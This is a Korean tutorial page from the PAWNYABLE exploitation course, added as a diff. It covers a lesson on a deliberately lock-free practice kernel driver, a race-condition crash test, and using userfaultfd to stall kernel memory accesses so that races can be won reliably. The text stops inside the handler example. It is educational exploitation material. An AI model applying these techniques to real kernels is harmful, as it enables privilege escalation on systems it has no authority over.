@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="kr">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//kr/linux-kernel/LK04/uffd.html">
+
+    <meta name="og:title" content="userfaultfd의 사용 - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>userfaultfd의 사용 | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/kr/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/kr/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/kr/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK04/uffd">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK04/uffd">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK04/uffd">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                userfaultfd의 사용
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK04/uffd">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK04/uffd">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK04/uffd">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK03/double_fetch.html">이전 페이지</a></div>
+            <div class="pagination-index"><a href="../index.html">목차</a></div>
+            <div class="pagination-fd"><a href="fuse.html">다음 페이지</a></div>
+        </div>
+    
+    
+        <div class="column" title="목차">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%99%95%EC%9D%B8"><span class="toc-text">드라이버 확인</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EC%B7%A8%EC%95%BD%EC%A0%90-%ED%99%95%EC%9D%B8"><span class="toc-text">취약점 확인</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#userfaultfd%EB%9E%80"><span class="toc-text">userfaultfd란?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#userfaultfd-%EC%82%AC%EC%9A%A9-%EC%98%88%EC%8B%9C"><span class="toc-text">userfaultfd 사용 예시</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Race-%EC%95%88%EC%A0%95%ED%99%94"><span class="toc-text">Race 안정화</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>LK04(Fleckvieh)에서는 LK01-4(Holstein v4)에서 다뤘던 것과 비슷한 Race Condition을 더 까다로운 조건에서 다룹니다. 먼저 <a href="distfiles/LK04.tar.gz">연습문제 LK04</a> 파일을 다운로드하세요.</p>
+<h2 id="드라이버-확인">드라이버 확인</h2>
+<p>먼저 드라이버 소스 코드를 읽어 봅시다. 이번 드라이버는 이전 것보다 양이 많고, 지금까지 등장하지 않았던 기능과 문법도 있습니다. <code>module_open</code>은 다음과 같습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">  <span class="comment">/* Allocate list head */</span></span><br><span class="line">  filp-&gt;private_data = (<span class="type">void</span>*)kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> list_head), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (unlikely(!filp-&gt;private_data))</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  INIT_LIST_HEAD((<span class="keyword">struct</span> list_head*)filp-&gt;private_data);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>먼저 4번째 줄의 <code>unlikely</code> 매크로에 주목합시다. 이것은 Linux 커널에서 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/compiler.h#L77">다음처럼 정의되며</a>, 매우 자주 등장합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> likely(x)      __builtin_expect(!!(x), 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(x)    __builtin_expect(!!(x), 0)</span></span><br></pre></td></tr></table></figure>
+<p>보안 검사나 메모리 부족 같은, 대부분 한쪽 분기만 타는 조건문에서 어느 쪽이 더 자주 실행되는지 컴파일러에 알려 주는 용도입니다. 예측이 맞으면 자주 실행되는 경로의 성능이 좋아질 수 있습니다.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="늑대" ></div>
+  <p class="says">
+    컴파일러에 힌트를 주면 자주 지나가는 경로의 명령 수나 분기 수를 줄여 줄 수 있어.
+    이런 이야기는 CPU 분기 예측과도 관련 있으니까 궁금하면 더 찾아봐.
+  </p>
+</div>
+<p>다음으로 7번째 줄의 <code>INIT_LIST_HEAD</code> 매크로는 <code>tty_struct</code> 등에서 봤던 이중 연결 리스트 <code>list_head</code> 구조체를 초기화하는 매크로입니다. 각 파일 open마다 이중 연결 리스트를 만들기 위해 <code>private_data</code>에 이 구조체를 넣고 있습니다.<br>
+이 리스트에는 <code>blob_list</code> 구조체가 연결됩니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125; blob_list;</span><br></pre></td></tr></table></figure>
+<p>리스트에 아이템을 추가할 때는 <code>list_add</code>, 삭제할 때는 <code>list_del</code>, 순회할 때는 <code>list_for_each_entry(_safe)</code> 같은 매크로를 사용합니다. 자세한 사용법은 필요할 때 찾아보면 됩니다.</p>
+<p><code>ioctl</code> 구현을 보면 이 모듈에는 <code>CMD_ADD</code>, <code>CMD_DEL</code>, <code>CMD_GET</code>, <code>CMD_SET</code> 네 가지 연산이 있다는 것을 알 수 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">top</span>;</span></span><br><span class="line">  <span class="type">request_t</span> req;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(copy_from_user(&amp;req, (<span class="type">void</span>*)arg, <span class="keyword">sizeof</span>(req))))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  top = (<span class="keyword">struct</span> list_head*)filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> CMD_ADD: <span class="keyword">return</span> blob_add(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_DEL: <span class="keyword">return</span> blob_del(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_GET: <span class="keyword">return</span> blob_get(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_SET: <span class="keyword">return</span> blob_set(top, &amp;req);</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>CMD_ADD</code>는 리스트에 <code>blob_list</code>를 추가합니다. 각 <code>blob_list</code>는 최대 0x1000바이트의 데이터를 가지며, 내용은 사용자가 임의로 넣을 수 있습니다. 추가 시에는 랜덤한 ID가 부여되고, 이 값이 <code>ioctl</code> 반환값으로 사용자에게 전달됩니다. 이후 사용자는 이 ID를 이용해 해당 <code>blob_list</code>를 조작합니다.<br>
+<code>CMD_DEL</code>은 ID를 전달하면 대응하는 <code>blob_list</code>를 리스트에서 삭제합니다.<br>
+<code>CMD_GET</code>은 ID와 버퍼, 크기를 지정해 해당 <code>blob_list</code>의 데이터를 사용자 공간으로 복사합니다.<br>
+마지막으로 <code>CMD_SET</code>은 ID와 버퍼, 크기를 지정해 사용자 공간의 데이터를 해당 <code>blob_list</code>에 복사합니다.</p>
+<p>이전 모듈들과 마찬가지로 데이터를 저장하는 기능이지만, Fleckvieh는 리스트로 데이터를 관리하므로 여러 개를 저장할 수 있습니다.</p>
+<h2 id="취약점-확인">취약점 확인</h2>
+<p>LK01을 모두 공부했다면 취약점은 금방 보일 것입니다. 어디에도 락이 없기 때문에 데이터 경쟁이 쉽게 발생합니다. 하지만 이 경쟁을 exploit하려고 하면 문제가 생깁니다.<br>
+데이터를 이중 연결 리스트라는 비교적 복잡한 구조로 관리하고 있기 때문에, 삭제되는 타이밍에 맞춰 데이터를 읽거나 쓰려고 하면 unlink 과정 자체와 충돌할 수 있고, 그 결과 링크나 커널 힙 상태가 망가집니다. 그러면 race 도중 크래시가 나거나, Use-after-Free를 정말 만들었는지 판정하기 어렵습니다.<br>
+직접 race 코드를 써서 확인해 봅시다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_ADD, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .id = id &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_DEL, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .id = id, .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_GET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .id = id, .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> race_win;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">race</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  <span class="keyword">while</span> (!race_win) &#123;</span><br><span class="line">    id = add(<span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    del(id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/fleckvieh&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/fleckvieh&quot;</span>);</span><br><span class="line"></span><br><span class="line">  race_win = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">pthread_t</span> th;</span><br><span class="line">  pthread_create(&amp;th, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">    id = add(<span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    del(id);</span><br><span class="line">  &#125;</span><br><span class="line">  race_win = <span class="number">1</span>;</span><br><span class="line">  pthread_join(th, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이 코드는 여러 스레드에서 데이터를 추가하고 삭제하는 작업을 반복합니다. 경쟁이 발생하면 이중 연결 리스트 링크가 깨지기 때문에, 마지막 <code>close</code>에서 리스트 내용을 해제하는 시점에 크래시가 납니다.</p>
+<p>그렇다면 이런 복잡한 데이터 구조에서의 race는 exploit할 수 없는 걸까요?</p>
+<h2 id="userfaultfd란">userfaultfd란?</h2>
+<p>이번처럼 조건이 복잡한 race를 exploit하거나, race 성공 확률을 거의 100%까지 끌어올리기 위해 <code>userfaultfd</code>라는 기능을 악용하는 방법이 있습니다.</p>
+<p>Linux를 <code>CONFIG_USERFAULTFD</code>와 함께 빌드하면 <strong>userfaultfd</strong>라는 기능을 사용할 수 있습니다. userfaultfd는 사용자 공간에서 페이지 폴트를 처리하기 위한 시스템 콜입니다.</p>
+<p><code>CAP_SYS_PTRACE</code>가 없는 사용자가 userfaultfd를 완전 권한으로 사용하려면 <code>unprivileged_userfaultfd</code> 플래그가 1이어야 합니다. 이 값은 <code>/proc/sys/vm/unprivileged_userfaultfd</code>에서 확인하거나 바꿀 수 있습니다. 기본값은 0이지만, LK04 머신에서는 1로 설정되어 있습니다.</p>
+<p>사용자는 <code>userfaultfd</code> 시스템 콜을 통해 파일 디스크립터를 받고, 이후 <code>ioctl</code>로 핸들러와 주소 범위를 설정합니다. 등록한 페이지에서 페이지 폴트가 발생하면(즉 첫 접근 시), 설정된 핸들러가 불리고, 사용자 공간에서 해당 페이지에 어떤 데이터를 공급할지 결정할 수 있습니다. 흐름은 다음과 같습니다.</p>
+<center>
+  <img src="img/uffd.png" alt="userfaultfd 처리 흐름" style="width:720px;">
+</center>
+<p>페이지 폴트가 발생하면 등록된 사용자 공간 핸들러가 실행되므로, 해당 페이지를 읽으려던 스레드는 핸들러가 데이터를 돌려줄 때까지 블록됩니다. 이 동작은 커널 공간에서 시작된 페이지 접근에도 동일하게 적용되므로, 메모리 읽기/쓰기 타이밍에 커널 실행을 멈출 수 있습니다.</p>
+<h2 id="userfaultfd-사용-예시">userfaultfd 사용 예시</h2>
+<p>다음 코드를 실행해 봅시다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *dummy_page;</span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">copy</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  dummy_page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (dummy_page == MAP_FAILED) fatal(<span class="string">&quot;mmap(dummy)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler_thread: waiting for page fault...&quot;</span>);</span><br><span class="line">  pollfd.fd = uffd;</span><br><span class="line">  pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pollfd.revents &amp; POLLERR || pollfd.revents &amp; POLLHUP)</span><br><span class="line">      fatal(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 페이지 폴트 대기 */</span></span><br><span class="line">    <span class="keyword">if</span> (read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) &lt;= <span class="number">0</span>) fatal(<span class="string">&quot;read(uffd)&quot;</span>);</span><br><span class="line">    assert (msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uffd: flag=0x%llx\n&quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uffd: addr=0x%llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 요청된 페이지에 대해 반환할 데이터 선택 */</span></span><br><span class="line">    <span class="keyword">if</span> (fault_cnt++ == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">strcpy</span>(dummy_page, <span class="string">&quot;Hello, World! (1)&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">strcpy</span>(dummy_page, <span class="string">&quot;Hello, World! (2)&quot;</span>);</span><br><span class="line">    copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)dummy_page;</span><br><span class="line">    copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">    copy.len = <span class="number">0x1000</span>;</span><br><span class="line">    copy.mode = <span class="number">0</span>;</span><br><span class="line">    copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;copy) == <span class="number">-1</span>) fatal(<span class="string">&quot;ioctl(UFFDIO_COPY)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">register_uffd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="type">pthread_t</span> th;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* userfaultfd 생성 */</span></span><br><span class="line">  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  <span class="keyword">if</span> (uffd == <span class="number">-1</span>) fatal(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_api.api = UFFD_API;</span><br><span class="line">  uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;ioctl(UFFDIO_API)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 페이지 등록 */</span></span><br><span class="line">  uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)addr;</span><br><span class="line">  uffdio_register.range.len = len;</span><br><span class="line">  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 페이지 폴트를 처리하는 스레드 생성 */</span></span><br><span class="line">  <span class="keyword">if</span> (pthread_create(&amp;th, <span class="literal">NULL</span>, fault_handler_thread, (<span 